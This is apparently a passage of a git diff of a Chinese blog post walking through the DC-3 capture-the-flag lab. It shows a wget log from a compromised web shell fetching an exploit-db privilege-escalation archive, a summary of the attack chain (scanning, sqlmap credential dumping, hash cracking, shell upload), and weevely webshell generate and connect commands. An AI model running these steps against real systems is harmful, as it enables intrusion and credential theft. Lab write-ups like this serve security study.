href="https://raw.githubusercontent.com/offensive-security/exploitdb-bin-sploits/master/bin-sploits/39772.zip">https://raw.githubusercontent.com/offensive-security/exploitdb-bin-sploits/master/bin-sploits/39772.zip</a> [following]<br>–2021-05-01 23:52:55–  <a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/offensive-security/exploitdb-bin-sploits/master/bin-sploits/39772.zip">https://raw.githubusercontent.com/offensive-security/exploitdb-bin-sploits/master/bin-sploits/39772.zip</a><br>Resolving raw.githubusercontent.com (raw.githubusercontent.com)… ::1, 127.0.0.1<br>Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|::1|:443… failed: Connection refused.<br>Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|127.0.0.1|:443… failed: Connection refused.<br>www-data@DC-3:/var/www $ ls<br>html<br>www-data@DC-3:/var/www $ wget  <a target="_blank" rel="noopener" href="https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip">https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip</a></p>
-<p>–2021-05-01 23:53:39–  <a target="_blank" rel="noopener" href="https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip">https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip</a><br>Resolving github.com (github.com)… 13.250.177.223<br>Connecting to github.com (github.com)|13.250.177.223|:443… connected.<br>HTTP request sent, awaiting response… No data received.<br>Retrying.</p>
-<p>–2021-05-01 23:53:56–  (try: 2)  <a target="_blank" rel="noopener" href="https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip">https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip</a><br>Connecting to github.com (github.com)|13.250.177.223|:443… failed: Connection refused.<br>Resolving github.com (github.com)… 13.229.188.59<br>Connecting to github.com (github.com)|13.229.188.59|:443… connected.<br>HTTP request sent, awaiting response… 302 Found<br>Location: <a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/offensive-security/exploitdb-bin-sploits/master/bin-sploits/39772.zip">https://raw.githubusercontent.com/offensive-security/exploitdb-bin-sploits/master/bin-sploits/39772.zip</a> [following]<br>–2021-05-01 23:54:18–  <a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/offensive-security/exploitdb-bin-sploits/master/bin-sploits/39772.zip">https://raw.githubusercontent.com/offensive-security/exploitdb-bin-sploits/master/bin-sploits/39772.zip</a><br>Resolving raw.githubusercontent.com (raw.githubusercontent.com)… ::1, 127.0.0.1<br>Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|::1|:443… failed: Connection refused.<br>Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|127.0.0.1|:443… failed: Connection refused.</p>
+<p>www-data@DC-3:/var/www $ wget
+https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip
+--2021-05-01 23:52:54--
+https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip
+Resolving github.com (github.com)... 13.250.177.223 Connecting to
+github.com (github.com)|13.250.177.223|:443... connected. HTTP request
+sent, awaiting response... 302 Found Location:
+https://raw.githubusercontent.com/offensive-security/exploitdb-bin-sploits/master/bin-sploits/39772.zip
+[following] --2021-05-01 23:52:55--
+https://raw.githubusercontent.com/offensive-security/exploitdb-bin-sploits/master/bin-sploits/39772.zip
+Resolving raw.githubusercontent.com (raw.githubusercontent.com)... ::1,
+127.0.0.1 Connecting to raw.githubusercontent.com
+(raw.githubusercontent.com)|::1|:443... failed: Connection refused.
+Connecting to raw.githubusercontent.com
+(raw.githubusercontent.com)|127.0.0.1|:443... failed: Connection
+refused. www-data@DC-3:/var/www $ ls html www-data@DC-3:/var/www $ wget
+https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip</p>
+<p>--2021-05-01 23:53:39--
+https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip
+Resolving github.com (github.com)... 13.250.177.223 Connecting to
+github.com (github.com)|13.250.177.223|:443... connected. HTTP request
+sent, awaiting response... No data received. Retrying.</p>
+<p>--2021-05-01 23:53:56-- (try: 2)
+https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip
+Connecting to github.com (github.com)|13.250.177.223|:443... failed:
+Connection refused. Resolving github.com (github.com)... 13.229.188.59
+Connecting to github.com (github.com)|13.229.188.59|:443... connected.
+HTTP request sent, awaiting response... 302 Found Location:
+https://raw.githubusercontent.com/offensive-security/exploitdb-bin-sploits/master/bin-sploits/39772.zip
+[following] --2021-05-01 23:54:18--
+https://raw.githubusercontent.com/offensive-security/exploitdb-bin-sploits/master/bin-sploits/39772.zip
+Resolving raw.githubusercontent.com (raw.githubusercontent.com)... ::1,
+127.0.0.1 Connecting to raw.githubusercontent.com
+(raw.githubusercontent.com)|::1|:443... failed: Connection refused.
+Connecting to raw.githubusercontent.com
+(raw.githubusercontent.com)|127.0.0.1|:443... failed: Connection
+refused.</p>
 </blockquote>
-<p>下载超时，尝试在kali先下载在让靶机在kiali上下载,最近VM虚拟机代理不管用了还在排查…</p>
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
-<br>
-
+<p>下载超时，尝试在kali先下载在让靶机在kiali上下载,最近VM虚拟机代理不管用了还在排查...</p>
+<p><br></p>
+<p><br></p>
+<p><br></p>
+<p><br></p>
+<p><br></p>
+<p><br></p>
 <p>总结</p>
 <ul>
-<li><p>namp扫网段和靶机开放端口</p>
-</li>
-<li><p>dirsearch扫描目录</p>
-</li>
-<li><p>信息搜集(Joomal)</p>
-</li>
-<li><p>Joomscan扫描版本</p>
-</li>
-<li><p>searchsploit 查找joomal漏洞</p>
-</li>
-<li><p>sqlmap跑后台账号密码(密码被hash)</p>
-</li>
-<li><p>john破解hash密码</p>
-</li>
-<li><p>登录后台，找上传shell的地方</p>
-</li>
-<li><p>使用weevely生产一句话<code>weevely generate &lt;password&gt; b.php</code></p>
-</li>
-<li><p>使用weevely连接<code>weevely &lt;URL&gt; &lt;password&gt;</code></p>
-</li>
+<li><p>namp扫网段和靶机开放端口</p></li>
+<li><p>dirsearch扫描目录</p></li>
+<li><p>信息搜集(Joomal)</p></li>
+<li><p>Joomscan扫描版本</p></li>
+<li><p>searchsploit 查找joomal漏洞</p></li>
+<li><p>sqlmap跑后台账号密码(密码被hash)</p></li>
+<li><p>john破解hash密码</p></li>
+<li><p>登录后台，找上传shell的地方</p></li>
+<li><p>使用weevely生产一句话<code>weevely generate &lt;password&gt; b.php</code></p></li>
+<li><p>使用weevely连接<code>weevely &lt;URL&gt; &lt;password&gt;</code></p></li>
 </ul>
-<p><em>weevely使用(webshell) <code>https://blog.csdn.net/qq_26090065/article/details/81235120</code></em></p>
+<p><em>weevely使用(webshell)
+<code>https://blog.csdn.net/qq_26090065/article/details/81235120</code></em></p>
 <ul>
 <li>提权(未完成)</li>
 </ul>
@@ -647,7 +774,7 @@ $R=$Z('',$X);$R();
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">193</span>
+          <span class="site-state-item-count">194</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -695,7 +822,7 @@ $R=$Z('',$X);$R();
 <div class="copyright">
   
   &copy; 
-  <span itemprop="copyrightYear">2024</span>
+  <span itemprop="copyrightYear">2025</span>
   <span class="with-love">
     <i class="fa fa-heart"></i>
   </span>
@@ -709,7 +836,7 @@ $R=$Z('',$X);$R();
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">19:10</span>
+    <span title="站点阅读时长">19:09</span>
 </div>
 
 <!--
@@ -720,7 +847,7 @@ $R=$Z('',$X);$R();
 <!--
 <div class="theme-info">
   <div class="powered-by"></div>
-  <span class="post-count">博客全站共266.3k字</span>
+  <span class="post-count">博客全站共267.3k字</span>
 </div>
 -->
         
@@ -860,6 +987,63 @@ window.addEventListener('pjax:success', () => {
 
     <div id="pjax">
   
+
+  
+      
+
+<script>
+  if (typeof MathJax === 'undefined') {
+    window.MathJax = {
+      loader: {
+          load: ['[tex]/mhchem'],
+        source: {
+          '[tex]/amsCd': '[tex]/amscd',
+          '[tex]/AMScd': '[tex]/amscd'
+        }
+      },
+      tex: {
+        inlineMath: {'[+]': [['$', '$']]},
+          packages: {'[+]': ['mhchem']},
+        tags: 'ams'
+      },
+      options: {
+        renderActions: {
+          findScript: [10, doc => {
+            document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
+              const display = !!node.type.match(/; *mode=display/);
+              const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
+              const text = document.createTextNode('');
+              node.parentNode.replaceChild(text, node);
+              math.start = {node: text, delim: '', n: 0};
+              math.end = {node: text, delim: '', n: 0};
+              doc.math.push(math);
+            });
+          }, '', false],
+          insertedScript: [200, () => {
+            document.querySelectorAll('mjx-container').forEach(node => {
+              let target = node.parentNode;
+              if (target.nodeName.toLowerCase() === 'li') {
+                target.parentNode.classList.add('has-jax');
+              }
+            });
+          }, '', false]
+        }
+      }
+    };
+    (function () {
+      var script = document.createElement('script');
+      script.src = '//cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js';
+      script.defer = true;
+      document.head.appendChild(script);
+    })();
+  } else {
+    MathJax.startup.document.state(0);
+    MathJax.texReset();
+    MathJax.typeset();
+  }
+</script>
+
+    
 
   
 
